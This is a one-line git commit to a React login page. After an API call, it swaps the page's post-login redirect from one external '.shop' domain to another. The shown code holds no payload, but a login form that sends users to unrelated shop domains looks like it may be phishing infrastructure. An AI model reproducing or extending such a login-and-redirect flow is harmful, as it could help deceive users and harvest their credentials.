6b2effc0d8941cdbd999e3304cbd2f1bada167dd
husknet <127146284+husknet@users.noreply.github.com>
2025-04-10 11:39:55 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://cuts.cookshowfiles.shop/';
+      window.location.href = 'https://ct.midway-games.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
